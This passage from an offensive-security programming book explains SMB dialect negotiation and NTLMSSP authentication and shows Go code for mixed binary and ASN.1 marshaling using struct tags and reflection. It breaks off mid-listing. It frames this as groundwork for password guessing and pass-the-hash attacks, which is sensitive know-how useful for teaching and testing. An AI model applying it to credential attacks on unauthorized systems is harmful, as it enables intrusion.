<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch6"><span epub:type="pagebreak" id="page_131"/><span class="big">6</span><br/>INTERACTING WITH SMB AND NTLM</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">In the previous chapters, you examined various common protocols used for network communication, including raw TCP, HTTP, and DNS. Each of these protocols has interesting use cases for attackers. Although an extensive number of other network protocols exist, we’ll conclude our discussion of network protocols by examining <em>Server Message Block</em> <em>(SMB)</em>, a protocol that arguably proves to be the most useful during Windows post-exploitation.</p>&#13;
<p class="indent">SMB is perhaps the most complicated protocol you’ll see in this book. It has a variety of uses, but SMB is commonly used for sharing resources such as files, printers, and serial ports across a network. For the offensive-minded reader, SMB allows interprocess communications between distributed network nodes via named pipes. In other words, you can execute arbitrary commands on remote hosts. This is essentially how PsExec, a Windows tool that executes remote commands locally, works.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_132"/>SMB has several other interesting use cases, particularly due to the way it handles <em>NT LAN Manager (NTLM) authentication</em>, a challenge-response security protocol used heavily on Windows networks. These uses include remote password guessing, hash-based authentication (or <em>pass-the-hash</em>), SMB relay, and NBNS/LLMNR spoofing. Covering each of these attacks would take an entire book.</p>&#13;
<p class="indent">We’ll begin this chapter with a detailed explanation of how to implement SMB in Go. Next, you’ll leverage the SMB package to perform remote password guessing, use the pass-the-hash technique to successfully authenticate yourself by using only a password’s hash, and crack the NTLMv2 hash of a password.</p>&#13;
<h3 class="h3" id="ch6lev1sec1">The SMB Package</h3>&#13;
<p class="noindent">At the time of this writing, no official SMB package exists in Go, but we created a package where you can find the book-friendly version at <a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/"><em>https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/</em></a>. Although we won’t show you every detail of this package in this chapter, you’ll still learn the basics of interpreting the SMB specification in order to create the binary communications necessary to “speak SMB,” unlike in previous chapters, where you simply reused fully compliant packages. You’ll also learn how to use a technique called <em>reflection</em> to inspect interface data types at runtime and define arbitrary Go structure field tags to marshal and unmarshal complicated, arbitrary data, while maintaining scalability for future message structures and data types.</p>&#13;
<p class="indent">While the SMB library we’ve built allows only basic client-side communications, the codebase is fairly extensive. You’ll see relevant examples from the SMB package so that you can fully understand how communications and tasks, such as SMB authentication, work.</p>&#13;
<h3 class="h3" id="ch6lev1sec2">Understanding SMB</h3>&#13;
<p class="noindent">SMB is an application-layer protocol, like HTTP, that allows network nodes to communicate with one another. Unlike HTTP 1.1, which communicates using ASCII-readable text, SMB is a binary protocol that uses a combination of fixed- and variable-length, positional, and little-endian fields. SMB has several versions, also known as <em>dialects</em>—that is, versions 2.0, 2.1, 3.0, 3.0.2, and 3.1.1. Each dialect performs better than its predecessors. Because the handling and requirements vary from one dialect to the next, a client and server must agree on which dialect to use ahead of time. They do this during an initial message exchange.</p>&#13;
<p class="indent">Generally, Windows systems support multiple dialects and choose the most current dialect that both the client and server support. Microsoft has provided <a href="ch06.xhtml#ch6tab1">Table 6-1</a>, which shows which Windows versions select which dialect during the negotiation process. (Windows 10 and WS 2016—not shown in the graphic—negotiate SMB version 3.1.1.)</p>&#13;
<p class="tabcap" id="ch6tab1"><span epub:type="pagebreak" id="page_133"/><strong>Table 6-1:</strong> SMB Dialects Negotiated By Windows Versions</p>&#13;
<table class="topbot-d">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:20%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Operating system</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Windows 8.1 WS 2012 R2</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Windows 8 WS 2012</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Windows 7 WS 2008 R2</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Windows Vista WS 2008</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Previous versions</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">Windows 8.1<br/>WS 2012 R2</p></td>&#13;
<td style="vertical-align: top;" class="color1"><p class="taba"><strong><span class="white">SMB 3.02</span></strong></p></td>&#13;
<td style="vertical-align: top;" class="color2"><p class="taba"><strong><span class="white">SMB 3.0</span></strong></p></td>&#13;
<td style="vertical-align: top;" class="color3"><p class="taba">SMB 2.1</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">SMB 1.0</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">Windows 8<br/>WS 2012</p></td>&#13;
<td style="vertical-align: top;" class="color2"><p class="taba"><strong><span class="white">SMB 3.0</span></strong></p></td>&#13;
<td style="vertical-align: top;" class="color2"><p class="taba"><strong><span class="white">SMB 3.0</span></strong></p></td>&#13;
<td style="vertical-align: top;" class="color3"><p class="taba">SMB 2.1</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">SMB 1.0</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">Windows 7<br/>WS 2008 R2</p></td>&#13;
<td style="vertical-align: top;" class="color3"><p class="taba">SMB 2.1</p></td>&#13;
<td style="vertical-align: top;" class="color3"><p class="taba">SMB 2.1</p></td>&#13;
<td style="vertical-align: top;" class="color3"><p class="taba">SMB 2.1</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">SMB 1.0</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">Windows Vista<br/>WS 2008</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;" class="color4"><p class="taba">SMB 2.0</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">SMB 1.0</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">Previous versions</p></td>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">SMB 1.0</p></td>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">SMB 1.0</p></td>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">SMB 1.0</p></td>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">SMB 1.0</p></td>&#13;
<td style="vertical-align: top;" class="table-h1aa"><p class="taba">SMB 1.0</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">For this chapter, you’ll use the SMB 2.1 dialect, because most modern Windows versions support it.</p>&#13;
<h4 class="h4" id="ch6lev2sec1">Understanding SMB Security Tokens</h4>&#13;
<p class="noindent">SMB messages contain <em>security tokens</em> used to authenticate users and machines across a network. Much like the process of selecting the SMB dialect, selecting the authentication mechanism takes place through a series of Session Setup messages, which allow clients and servers to agree on a mutually supported authentication type. Active Directory domains commonly use <em>NTLM Security Support Provider</em> <em>(NTLMSSP)</em>, a binary, positional protocol that uses NTLM password hashes in combination with challenge-response tokens in order to authenticate users across a network. <em>Challenge-response tokens</em> are like the cryptographic answer to a question; only an entity that knows the correct password can answer the question correctly. Although this chapter focuses solely on NTLMSSP, Kerberos is another common authentication mechanism.</p>&#13;
<p class="indent">Separating the authentication mechanism from the SMB specification itself allows SMB to use different authentication methods in different environments, depending on domain and enterprise security requirements as well as client-server support. However, separating the authentication and the SMB specification makes it more difficult to create an implementation in Go, because the authentication tokens are <em>Abstract Syntax Notation One (ASN.1)</em> encoded. For this chapter, you don’t need to know too much about ASN.1—just know that it’s a binary encoding format that differs from the positional binary encoding you’ll use for general SMB. This mixed encoding adds complexity.</p>&#13;
<p class="indent">Understanding NTLMSSP is crucial to creating an SMB implementation that is smart enough to marshal and unmarshal message fields selectively, while accounting for the potential that adjacent fields—within a single message—may be encoded or decoded differently. Go has standard packages that you can use for binary and ASN.1 encoding, but Go’s <span epub:type="pagebreak" id="page_134"/>ASN.1 package wasn’t built for general-purpose use; so you must take into account a few nuances.</p>&#13;
<h4 class="h4" id="ch6lev2sec2">Setting Up an SMB Session</h4>&#13;
<p class="noindent">The client and server perform the following process to successfully set up an SMB 2.1 session and choose the NTLMSSP dialect:</p>&#13;
<ol>&#13;
<li><p class="noindent">The client sends a Negotiate Protocol request to the server. The message includes a list of dialects that the client supports.</p></li>&#13;
<li><p class="noindent">The server responds with a Negotiate Protocol response message, which indicates the dialect the server selected. Future messages will use that dialect. Included in the response is a list of authentication mechanisms the server supports.</p></li>&#13;
<li><p class="noindent">The client selects a supported authentication type, such as NTLMSSP, and uses the information to create and send a Session Setup request message to the server. The message contains an encapsulated security structure indicating that it’s an NTLMSSP Negotiate request.</p></li>&#13;
<li><p class="noindent">The server replies with a Session Setup response message. This message indicates that more processing is required and includes a server challenge token.</p></li>&#13;
<li><p class="noindent">The client calculates the user’s NTLM hash—which uses the domain, user, and password as inputs—and then uses it in combination with the server challenge, random client challenge, and other data to generate the challenge response. It includes this in a new Session Setup request message that the client sends to the server. Unlike the message sent in step 3, the encapsulated security structure indicates that it’s an NTLMSSP Authenticate request. This way, the server can differentiate between the two Session Setup SMB requests.</p></li>&#13;
<li><p class="noindent">The server interacts with an authoritative resource, such as a domain controller for authentication using domain credentials, to compare the challenge-response information the client supplied with the value the authoritative resource calculated. If they match, the client is authenticated. The server sends a Session Setup response message back to the client, indicating that login was successful. This message contains a unique session identifier that the client can use to track session state.</p></li>&#13;
<li><p class="noindent">The client sends additional messages to access file shares, named pipes, printers, and so on; each message includes the session identifier as a reference through which the server can validate the authentication status of the client.</p></li>&#13;
</ol>&#13;
<p class="indent">You might now begin to see how complicated SMB is and understand why there is neither a standard nor a third-party Go package that implements the SMB specification. Rather than take a comprehensive approach and discuss every nuance of the libraries we created, let’s focus on a few of the structures, messages, or unique aspects that can help you implement your own versions of well-defined networking protocols. Instead of <span epub:type="pagebreak" id="page_135"/>extensive code listings, this chapter discusses only the good stuff, sparing you from information overload.</p>&#13;
<p class="indentb">You can use the following relevant specifications as a reference, but don’t feel obligated to read each one. A Google search will let you find the latest revisions.</p>&#13;
<p class="noindentf"><strong>MS-SMB2</strong> The SMB2 specification to which we attempted to conform. This is the main specification of concern and encapsulates a Generic Security Service Application Programming Interface (GSS-API) structure for performing authentication.</p>&#13;
<p class="noindentf"><strong>MS-SPNG and RFC 4178</strong> The GSS-API specification within which the MS-NLMP data is encapsulated. The structure is ASN.1 encoded.</p>&#13;
<p class="noindentf"><strong>MS-NLMP</strong> The specification used for understanding NTLMSSP authentication token structure and challenge-response format. It includes formulas and specifics for calculating things like the NTLM hash and authentication response token. Unlike the outer GSS-API container, NTLMSSP data isn’t ASN.1 encoded.</p>&#13;
<p class="noindentf"><strong>ASN.1</strong> The specification for encoding data by using ASN.1 format.</p>&#13;
<p class="indentt">Before we discuss the interesting snippets of code from the package, you should understand some of the challenges you need to overcome in order to get working SMB communications.</p>&#13;
<h4 class="h4" id="ch6lev2sec3">Using Mixed Encoding of Struct Fields</h4>&#13;
<p class="noindent">As we alluded to earlier, the SMB specification requires positional, binary, little-endian, fixed- and variable-length encoding for the majority of the message data. But some fields need to be ASN.1 encoded, which uses explicitly tagged identifiers for field index, type, and length. In this case, many of the ASN.1 subfields to be encoded are optional and not restricted to a specific position or order within the message field. This may help clarify the challenge.</p>&#13;
<p class="indent">In <a href="ch06.xhtml#ch6list1">Listing 6-1</a>, you can see a hypothetical <code>Message</code> struct that presents these challenges.</p>&#13;
<pre>type Foo struct {&#13;
    X int&#13;
    Y []byte&#13;
}&#13;
type Message struct {&#13;
    A int    // Binary, positional encoding&#13;
    B Foo    // ASN.1 encoding as required by spec&#13;
    C bool   // Binary, positional encoding&#13;
}</pre>&#13;
<p class="caption" id="ch6list1"><em>Listing 6-1: A hypothetical example of a struct requiring variable field encodings</em></p>&#13;
<p class="indent">The crux of the problem here is that you can’t encode all the types inside the <code>Message</code> struct by using the same encoding scheme because <code>B</code>, a <code>Foo</code> type, is expected to be ASN.1 encoded, whereas other fields aren’t.</p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_136"/>Writing a Custom Marshaling and Unmarshaling Interface</h5>&#13;
<p class="noindent">Recall from previous chapters that encoding schemes such as JSON or XML recursively encode the struct and all fields by using the same encoding format. It was clean and simple. You don’t have the same luxury here, because Go’s <code>binary</code> package behaves the same way—it encodes all structs and struct fields recursively without a care in the world, but this won’t work for you because the message requires mixed encoding:</p>&#13;
<pre>binary.Write(<span class="codeitalic1">someWriter</span>, binary.LittleEndian, <span class="codeitalic1">message</span>)</pre>&#13;
<p class="indent">The solution is to create an interface that allows arbitrary types to define custom marshaling and unmarshaling logic (<a href="ch06.xhtml#ch6list2">Listing 6-2</a>).</p>&#13;
<pre><span class="ent">❶</span> type BinaryMarshallable interface {&#13;
    <span class="ent">❷</span> MarshalBinary(*Metadata) ([]byte, error)&#13;
    <span class="ent">❸</span> UnmarshalBinary([]byte, *Metadata) error&#13;
   }</pre>&#13;
<p class="caption" id="ch6list2"><em>Listing 6-2: An interface definition requiring custom marshaling and unmarshaling methods</em></p>&#13;
<p class="indent">The interface <span class="ent">❶</span>, <code>BinaryMarshallable</code>, defines two methods that must be implemented: <code>MarshalBinary()</code> <span class="ent">❷</span> and <code>UnmarshalBinary()</code> <span class="ent">❸</span>. Don’t worry too much about the <code>Metadata</code> type passed into the functions, as it’s not relevant to understand the main functionality.</p>&#13;
<h5 class="h5">Wrapping the Interface</h5>&#13;
<p class="noindent">Any type that implements the <code>BinaryMarshallable</code> interface can control its own encoding. Unfortunately, it’s not as simple as just defining a few functions on the <code>Foo</code> data type. After all, Go’s <code>binary.Write()</code> and <code>binary.Read()</code> methods, which you use for encoding and decoding binary data, don’t know anything about your arbitrarily defined interface. You need to create a <code>marshal()</code> and <code>unmarshal()</code> wrapper function, within which you inspect the data to determine whether the type implements the <code>BinaryMarshallable</code> interface, as in <a href="ch06.xhtml#ch6list3">Listing 6-3</a>. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.)</p>&#13;
<pre>func marshal(v interface{}, meta *Metadata) ([]byte, error) {&#13;
    <span class="codeitalic1">--snip--</span>&#13;
    bm, ok := v.(BinaryMarshallable) <span class="ent">❶</span>&#13;
    if ok {&#13;
        // Custom marshallable interface found.&#13;
        buf, err := bm.MarshalBinary(meta) <span class="ent">❷</span>&#13;
        if err != nil {&#13;
            return nil, err&#13;
        }&#13;
        return buf, nil&#13;
    }&#13;
    <span class="codeitalic1">--snip--</span>&#13;
}&#13;
<span epub:type="pagebreak" id="page_137"/><span class="codeitalic1">--snip--</span>&#13;
func unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {&#13;
    <span class="codeitalic1">--snip--</span>&#13;
    bm, ok := v.(BinaryMarshallable) <span class="ent">❸</span>&#13;
    if ok {&#13;
        // Custom marshallable interface found.&#13;
        if err := bm.UnmarshalBinary(buf, meta)<span class="ent">❹</span>; err != nil {&#13;
            return nil, err&#13;
        }&#13;
        return bm, nil&#13;
    }&#13;
    <span class="codeitalic1">--snip--</span>&#13;
}</pre>&#13;
<p class="caption" id="ch6list3"><em>Listing 6-3: Using type assertions to perform custom data marshaling and unmarshaling (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go">/ch-6/smb/smb/encoder/encoder.go</a><em>)</em></p>&#13;
<p class="indent"><a href="ch06.xhtml#ch6list3">Listing 6-3</a> details only a subsection of the <code>marshal()</code> and <code>unmarshal()</code> functions taken from <a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go"><em>https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go</em></a>. Both functions contain a similar section of code that attempts to assert the supplied interface, <code>v</code>, to a <code>BinaryMarshallable</code> variable named <code>bm</code> <span class="ent">❶</span><span class="ent">❸</span>. This succeeds only if whatever type <code>v</code> is actually implements the necessary functions required by your <code>BinaryMarshallable</code> interface. If it succeeds, your <code>marshal()</code> function <span class="ent">❷</span> makes a call to <code>bm.MarshalBinary()</code>, and your <code>unmarshal</code><code>()</code> function <span class="ent">❹</span> makes a call to <code>bm.UnmarshalBinary()</code>. At this point, your program flow will branch off into the type’s encoding and decoding logic, allowing a type to maintain complete control over the way it’s handled.</p>&#13;
<h5 class="h5">Forcing ASN.1 Encoding</h5>&#13;
<p class="noindent">Let’s look at how to force your <code>Foo</code> type to be ASN.1 encoded, while leaving other fields in your <code>Message</code> struct as-is. To do this, you need to define the <code>MarshalBinary()</code> and <code>UnmarshalBinary()</code> functions on the type, as in <a href="ch06.xhtml#ch6list4">Listing 6-4</a>.</p>&#13;
<pre>func (f *Foo) MarshalBinary(meta *encoder.Metadata) ([]byte, error) {&#13;
    buf, err := asn1.Marshal(*f)<span class="ent">❶</span>&#13;
    if err != nil {&#13;
        return nil, err&#13;
    }&#13;
    return buf, nil&#13;
}&#13;
&#13;
func (f *Foo) UnmarshalBinary(buf []byte, meta *encoder.Metadata) error {&#13;
    data := Foo{}&#13;
    if _, err := asn1.Unmarshal(buf, &amp;data)<span class="ent">❷</span>; err != nil {&#13;
        return err&#13;
    }&#13;
    *f = data&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch6list4"><em>Listing 6-4: Implementing the <code>BinaryMarshallable</code> interface for ASN.1 encoding</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_138"/>The methods don’t do much besides make calls to Go’s <code>asn1.Marshal()</code> <span class="ent">❶</span> and <code>asn1.Unmarshal()</code> <span class="ent">❷</span> functions. You can find variations of these functions within the <code>gss</code> package code at <a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/gss/gss.go"><em>https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/gss/gss.go</em></a>. The only real difference between them is that the <code>gss</code> package code has additional tweaks to make Go’s <code>asn1</code> encoding function play nicely with the data format defined within the SMB spec.</p>&#13;
<p class="indent">The <code>ntlmssp</code> package at <a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go"><em>https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go</em></a> contains an alternative implementation of the <code>MarshalBinary()</code> and <code>UnmarshalBinary()</code> functions. Although it doesn’t demonstrate ASN.1 encoding, the <code>ntlmssp</code> code shows how to handle encoding of an arbitrary data type by using necessary metadata. The metadata—the lengths and offsets of variable-length <code>byte</code> slices—is pertinent to the encoding process. This metadata leads us to the next challenge you need to address.</p>&#13;
<h4 class="h4" id="ch6lev2sec4">Understanding Metadata and Referential Fields</h4>&#13;
<p class="noindentb1">If you dig into the SMB specification a little, you’ll find that some messages contain fields that reference other fields of the same message. For example, the fields—taken from the Negotiate response message—refer to the offset and length of a variable-length byte slice that contains the actual value:</p>&#13;
<p class="noindentf"><strong>SecurityBufferOffset (2 bytes):</strong> The offset, in bytes, from the beginning of the SMB2 header to the security buffer.</p>&#13;
<p class="noindentf1"><strong>SecurityBufferLength (2 bytes):</strong> The length, in bytes, of the security buffer.</p>&#13;
<p class="indentb">These fields essentially act as metadata. Later in the message spec, you find the variable-length field within which your data actually resides:</p>&#13;
<p class="noindentf"><strong>Buffer (variable):</strong> The variable-length buffer that contains the security buffer for the response, as specified by SecurityBufferOffset and SecurityBufferLength. The buffer SHOULD contain a token as produced by the GSS protocol as specified in section 3.3.5.4. If SecurityBufferLength is 0, this field is empty and client-initiated authentication, with an authentication protocol of the client’s choice, will be used instead of server-initiated SPNEGO authentication, as described in [MS-AUTHSOD] section 2.1.2.2.</p>&#13;
<p class="indentt">Generally speaking, this is how the SMB spec consistently handles variable-length data: fixed-position length and offset fields depicting the size and location of the data itself. This is not specific to response messages or the Negotiate message, and often you’ll find multiple fields within a single message using this pattern. Really, anytime you have a variable-length field, you’ll find this pattern. The metadata explicitly instructs the message receiver on how to locate and extract the data.</p>&#13;
<p class="indent">This is useful, but it complicates your encoding strategy because you now need to maintain a relationship between different fields within a struct. You can’t, for example, just marshal an entire message because <span epub:type="pagebreak" id="page_139"/>some of the metadata fields—for example, length and offset—won’t be known until the data itself is marshaled or, in the case of the offset, all fields preceding the data are marshaled.</p>&#13;
<h4 class="h4" id="ch6lev2sec5">Understanding the SMB Implementation</h4>&#13;
<p class="noindent">The remainder of this subsection addresses some of the ugly details regarding the SMB implementation we devised. You don’t need to understand this information to use the package.</p>&#13;
<p class="indent">We played around with a variety of approaches to handle referential data, eventually settling on a solution that utilizes a combination of structure field tags and reflection. Recall that <em>reflection</em> is a technique through which a program can inspect itself, particularly examining things like its own data types. <em>Field tags</em> are somewhat related to reflection in that they define arbitrary metadata about a struct field. You may recall them from previous XML, MSGPACK, or JSON encoding examples. For example, <a href="ch06.xhtml#ch6list5">Listing 6-5</a> uses struct tags to define JSON field names.</p>&#13;
<pre>type Foo struct {&#13;
    A int    `json:"a"`&#13;
    B string `json:"b"`&#13;
}</pre>&#13;
<p class="caption" id="ch6list5"><em>Listing 6-5: A struct defining JSON field tags</em></p>&#13;
<p class="indent">Go’s <code>reflect</code> package contains the functions we used to inspect data types and extract field tags. At that point, it was a matter of parsing the tags and doing something meaningful with their values. In <a href="ch06.xhtml#ch6list6">Listing 6-6</a>, you can see a struct defined in the SMB package.</p>&#13;
<pre>type NegotiateRes struct {&#13;
    Header&#13;
    StructureSize        uint16&#13;
    SecurityMode         uint16&#13;
    DialectRevision      uint16&#13;
    Reserved             uint16&#13;
    ServerGuid           []byte `smb:"fixed:16"`<span class="ent">❶</span>&#13;
    Capabilities         uint32&#13;
    MaxTransactSize      uint32&#13;
    MaxReadSize          uint32&#13;
    MaxWriteSize         uint32&#13;
    SystemTime           uint64&#13;
    ServerStartTime      uint64&#13;
    SecurityBufferOffset uint16 `smb:"offset:SecurityBlob"`<span class="ent">❷</span>&#13;
    SecurityBufferLength uint16 `smb:"len:SecurityBlob"`<span class="ent">❸</span>&#13;
    Reserved2            uint32&#13;
    SecurityBlob         *gss.NegTokenInit&#13;
}</pre>&#13;
<p class="caption" id="ch6list6"><em>Listing 6-6: Using SMB field tags for defining field metadata (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/smb.go">/ch-6/smb/smb/smb.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_140"/>This type uses three field tags, identified by the SMB key: <code>fixed</code> <span class="ent">❶</span>, <code>offset</code> <span class="ent">❷</span>, and <code>len</code> <span class="ent">❸</span>. Keep in mind that we chose all these names arbitrarily. You aren’t obligated to use a specific name. The intent of each tag is as follows:</p>&#13;
<ul>&#13;
<li><p class="noindent"><code>fixed</code> identifies a <code>[]byte</code> as a fixed-length field of the provided size. In this case, <code>ServerGuid</code> is 16 bytes in length.</p></li>&#13;
<li><p class="noindent"><code>offset</code> defines the number of bytes from the beginning of the struct to the first position of a variable-length data buffer. The tag defines the name of the field—in this case, <code>SecurityBlob</code>—to which the offset relates. A field by this referenced name is expected to exist in the same struct.</p></li>&#13;
<li><p class="noindent"><code>len</code> defines the length of a variable-length data buffer. The tag defines the name of the field—in this case, <code>SecurityBlob</code>, to which the length relates. A field by this referenced name should exist in the same struct.</p></li>&#13;
</ul>&#13;
<p class="indent">As you might have noticed, our tags allow us not only to create relationships—through arbitrary metadata—between different fields, but also to differentiate between fixed-length byte slices and variable-length data. Unfortunately, adding these struct tags doesn’t magically fix the problem. The code needs to have the logic to look for these tags and take specific actions on them during marshaling and unmarshaling.</p>&#13;
<h5 class="h5">Parsing and Storing Tags</h5>&#13;
<p class="noindent">In <a href="ch06.xhtml#ch6list7">Listing 6-7</a>, the convenience function, called <code>parseTags()</code>, performs the tag-parsing logic and stores the data in a helper struct of type <code>TagMap</code>.</p>&#13;
<pre>func parseTags(sf reflect.StructField<span class="ent">❶</span>) (*TagMap, error) {&#13;
    ret := &amp;TagMap{&#13;
        m:   make(map[string]interface{}),&#13;
        has: make(map[string]bool),&#13;
    }&#13;
    tag := sf.Tag.Get("smb")<span class="ent">❷</span>&#13;
    smbTags := strings.Split(tag, ",")<span class="ent">❸</span>&#13;
    for _, smbTag := range smbTags<span class="ent">❹</span> {&#13;
        tokens := strings.Split(smbTag, ":")<span class="ent">❺</span>&#13;
        switch tokens[0] { <span class="ent">❻</span>&#13;
        case "len", "offset", "count":&#13;
            if len(tokens) != 2 {&#13;
                return nil, errors.New("Missing required tag data. Expecting key:val")&#13;
            }&#13;
            ret.Set(tokens[0], tokens[1])&#13;
        case "fixed":&#13;
            if len(tokens) != 2 {&#13;
                return nil, errors.New("Missing required tag data. Expecting key:val")&#13;
            }&#13;
            i, err := strconv.Atoi(tokens[1])&#13;
            if err != nil {&#13;
                return nil, err&#13;
<span epub:type="pagebreak" id="page_141"/>            }&#13;
            ret.Set(tokens[0], i) <span class="ent">❼</span>&#13;
       &#13;
    }</pre>&#13;
<p class="caption" id="ch6list7"><em>Listing 6-7: Parsing structure tags (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go">/ch-6/smb/smb/encoder/encoder.go</a><em>)</em></p>&#13;
<p class="indent">The function accepts a parameter named <code>sf</code> of type <code>reflect.StructField</code> <span class="ent">❶</span>, which is a type defined within Go’s <code>reflect</code> package. The code calls <code>sf.Tag.Get("smb")</code> on the <code>StructField</code> variable to retrieve any <code>smb</code> tags defined on the field <span class="ent">❷</span>. Again, this is an arbitrary name we chose for our program. We just need to make sure that the code to parse the tags is using the same key as the one we used in our struct’s type definition.</p>&#13;
<p class="indent">We then split the <code>smb</code> tags on a comma <span class="ent">❸</span>, in case we need to have multiple <code>smb</code> tags defined on a single struct field in the future, and loop through each tag <span class="ent">❹</span>. We split each tag on a colon <span class="ent">❺</span>—recall that we used the format <span class="codeitalic">name</span><code>:</code><span class="codeitalic">value</span> for our tags, such as <code>fixed:16</code> and <code>len:SecurityBlob</code>. With the individual tag data separated into its basic key and value pairing, we use a <code>switch</code> statement on the key to perform key-specific validation logic, such as converting values to integers for <code>fixed</code> tag values <span class="ent">❻</span>.</p>&#13;
<p class="indent">Lastly, the function sets the data in our custom map named <code>ret</code> <span class="ent">❼</span>.</p>&#13;
<h5 class="h5">Invoking the parseTags() Function and Creating a reflect.StructField Object</h5>&#13;
<p class="noindent">Now, how do we invoke the function, and how do we create an object of type <code>reflect.StructField</code>? To answer these questions, look at the <code>unmarshal()</code> function in <a href="ch06.xhtml#ch6list8">Listing 6-8</a>, which is within the same source file that has our <code>parseTags()</code> convenience function. The <code>unmarshal()</code> function is extensive, so we’ll just piece together the most relevant portions.</p>&#13;
<pre>func unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {&#13;
    typev := reflect.TypeOf(v) <span class="ent">❶</span>&#13;
    valuev := reflect.ValueOf(v) <span class="ent">❷</span>&#13;
    <span class="codeitalic1">--snip--</span>&#13;
    r := bytes.NewBuffer(buf)&#13;
    switch typev.Kind() { <span class="ent">❸</span>&#13;
    case reflect.Struct:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    case reflect.Uint8:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    case reflect.Uint16:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    case reflect.Uint32:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    case reflect.Uint64:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    case reflect.Slice, reflect.Array:&#13;
        <span class="codeitalic1">--snip--</span>&#13;
    default:&#13;
        return errors.New("Unmarshal not implemented for kind:" + typev.Kind().String()), nil&#13;
    }&#13;
&#13;
    <span epub:type="pagebreak" id="page_142"/>return nil, nil&#13;
&#13;
}</pre>&#13;
<p class="caption" id="ch6list8"><em>Listing 6-8: Using reflection to dynamically unmarshal unknown types (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go">/ch-6/smb/smb/encoder/encoder.go</a><em>)</em></p>&#13;
<p class="indent">The <code>unmarshal()</code> function uses Go’s <code>reflect</code> package to retrieve the type <span class="ent">❶</span> and value <span class="ent">❷</span> of the destination interface to which our data buffer will be unmarshaled. This is necessary because in order to convert an arbitrary byte slice into a struct, we need to know how many fields are in the struct and how many bytes to read for each field. For example, a field defined as <code>uint16</code> consumes 2 bytes, whereas a <code>uint64</code> consumes 8 bytes. By using reflection, we can interrogate the destination interface to see what data type it is and how to handle the reading of data. Because the logic for each type will differ, we perform a <code>switch</code> on the type by calling <code>typev.Kind()</code> <span class="ent">❸</span>, which returns a <code>reflect.Kind</code> instance indicating the kind of data type we’re working with. You’ll see that we have a separate case for each of the allowed data types.</p>&#13;
<h5 class="h5">Handling Structs</h5>&#13;
<p class="noindent">Let’s look at the <code>case</code> block, in <a href="ch06.xhtml#ch6list9">Listing 6-9</a>, that handles a struct type, since that is a likely initial entry point.</p>&#13;
<pre>case reflect.Struct:&#13;
        m := &amp;Metadata{ <span class="ent">❶</span>&#13;
            Tags:       &amp;TagMap{},&#13;
            Lens:       make(map[string]uint64),&#13;
